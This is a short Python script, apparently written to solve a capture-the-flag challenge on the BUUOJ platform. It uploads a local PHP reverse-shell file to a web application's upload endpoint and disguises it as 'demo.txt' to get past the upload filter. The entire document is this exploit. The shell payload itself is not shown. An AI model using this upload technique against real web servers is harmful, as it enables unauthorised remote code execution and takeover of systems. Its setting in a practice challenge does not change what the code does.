import requests

url = 'http://f447a902-5158-4a27-b4af-788561c5b387.node5.buuoj.cn:81/index.php?act=upload'

reverse_shell = open('./clear_reverse_chinese.php', 'rb')

def upload_reverse_shell():
    resp = requests.post(url, files={'file': ('demo.txt', reverse_shell)}, timeout=8)
    print(resp.text)

if __name__ == '__main__':
    upload_reverse_shell()
    reverse_shell.close()